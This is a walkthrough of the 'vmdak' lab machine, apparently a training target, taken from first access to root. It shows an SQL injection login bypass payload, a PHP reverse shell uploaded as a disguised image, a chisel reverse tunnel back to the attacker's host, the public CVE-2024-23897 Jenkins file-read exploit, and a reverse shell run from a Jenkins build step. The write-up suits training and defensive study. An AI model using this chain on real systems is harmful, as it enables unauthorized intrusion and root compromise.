---
icon: ubuntu
---

# vmdak - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.194.103 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-05 20:41 EDT
Nmap scan report for 192.168.194.103
Host is up (0.030s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0            1752 Sep 19  2024 config.xml
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.158
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 76:18:f1:19:6b:29:db:da:3d:f6:7b:ab:f4:b5:63:e0 (ECDSA)
|_  256 cb:d8:d6:ef:82:77:8a:25:32:08:dd:91:96:8d:ab:7d (ED25519)
80/tcp   open  http     Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
9443/tcp open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.58 (Ubuntu)
| ssl-cert: Subject: commonName=vmdak.local/organizationName=PrisonManagement/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:vmdak.local
| Not valid before: 2024-08-20T09:21:33
|_Not valid after:  2025-08-20T09:21:33
|_http-title:  Home - Prison Management System
| tls-alpn: 
|_  http/1.1
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   32.82 ms 192.168.45.1
2   32.71 ms 192.168.45.254
3   32.88 ms 192.168.251.1
4   25.73 ms 192.168.194.103
```

### <mark style="color:$primary;">FTP Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (576).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (577).png" alt=""><figcaption></figcaption></figure>

FTP allowed for anonymous login and we were able to find the initial root passwords location! And this also tells us there is an instance of Jenkins running

### <mark style="color:$primary;">HTTPS Port 9443 TCP</mark>

<figure><img src="../../.gitbook/assets/image (578).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (579).png" alt=""><figcaption></figcaption></figure>

```
admin' OR 1=1 -- -
```

The login form is vulnerable to SQLI

<figure><img src="../../.gitbook/assets/image (580).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (589).png" alt=""><figcaption></figcaption></figure>

Leave Management reveals a name and password I will keep that in mind

### <mark style="color:$primary;">Fast 5 Prison Management System Arbitrary File Upload Vulnerability</mark>

I managed to find a detailed guide on how to exploit this at this [**repo**](https://github.com/Aa1b/mycve/blob/main/Readme.md)

<figure><img src="../../.gitbook/assets/image (581).png" alt=""><figcaption></figcaption></figure>

We loged in as admin so will go to the <mark style="color:yellow;">**add-admin.php**</mark> endpoint

<figure><img src="../../.gitbook/assets/image (582).png" alt=""><figcaption></figcaption></figure>

I'll use pentest monkey's php reverse shell and save it as reverse.jpg

<figure><img src="../../.gitbook/assets/image (583).png" alt=""><figcaption></figcaption></figure>

Create User and capture the request in burpsuite

<figure><img src="../../.gitbook/assets/image (584).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (585).png" alt=""><figcaption></figcaption></figure>

Change the file's extension from .jpg to .php and then forward the request

<figure><img src="../../.gitbook/assets/image (586).png" alt=""><figcaption></figcaption></figure>

Now to get a reverse shell have a listener ready and visit the following page

```
https://192.168.194.103:9443/uploadImage/Profile/reverse.php
```

<figure><img src="../../.gitbook/assets/image (587).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (588).png" alt=""><figcaption></figcaption></figure>

shell as www-data

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Credential Reuse</mark>

<figure><img src="../../.gitbook/assets/image (590).png" alt=""><figcaption></figcaption></figure>

I am going to test and see if the password that i found earlier works on vmdak or root

<figure><img src="../../.gitbook/assets/image (591).png" alt=""><figcaption></figcaption></figure>

It works on vmdak

### <mark style="color:$primary;">Discovered Jenkins on Port 8080</mark>

<figure><img src="../../.gitbook/assets/image (592).png" alt=""><figcaption></figcaption></figure>

```
ps auxwww
```

<figure><img src="../../.gitbook/assets/image (593).png" alt=""><figcaption></figcaption></figure>

it looks like there is an instance of jenkins running on localhost port 8080

### <mark style="color:$primary;">Port Forwarding</mark>

I will use [**chisel**](https://github.com/jpillora/chisel) for port forwarding

```
./chisel_1.10.1_linux_amd64 server -p 80 --reverse
```

<figure><img src="../../.gitbook/assets/image (2448).png" alt=""><figcaption></figcaption></figure>

```
./chisel_1.10.1_linux_amd64 client 192.168.45.158:80 R:8085:localhost:8080
```

<figure><img src="../../.gitbook/assets/image (2449).png" alt=""><figcaption></figcaption></figure>

Once the port forwarding was established, I was able to access the application, which turned out to be the Jenkins login page

<figure><img src="../../.gitbook/assets/image (2450).png" alt=""><figcaption></figcaption></figure>

The application provided a hint, indicating the path where the initial admin password is located.

From there, I researched Jenkins vulnerabilities and discovered CVE-2024–23897, which allows unauthenticated attackers to read arbitrary files on the Jenkins controller file system. [**Link**](https://github.com/godylockz/CVE-2024-23897)

### <mark style="color:$primary;">Jenkins Unauthenticated Arbitrary file read</mark>

```
git clone https://github.com/godylockz/CVE-2024-23897.git
```

```
python jenkins_fileread.py -u http://localhost:8085
```

<figure><img src="../../.gitbook/assets/image (2451).png" alt=""><figcaption></figcaption></figure>

Using this vulnerability, I was able to retrieve the password for the Jenkins admin account

<figure><img src="../../.gitbook/assets/image (2452).png" alt=""><figcaption></figcaption></figure>

I successfully logged with the Jenkins admin password, where I had the ability to create new builds.

### <mark style="color:$primary;">Jenkins Build RCE</mark>

<mark style="color:yellow;">**Step 1 -> Create a job -> Name it test**</mark>

From there, I created a new build and added my reverse shell in the build steps. After placing the reverse shell, I clicked on the \[Build Now] option and was able to receive a reverse shell as the root user.

<figure><img src="../../.gitbook/assets/image (2453).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2454).png" alt=""><figcaption></figcaption></figure>

Save!

<mark style="color:yellow;">**Step 2 -> Execute Shell**</mark>

<figure><img src="../../.gitbook/assets/image (2455).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2456).png" alt=""><figcaption></figcaption></figure>

And we got a shell as root!
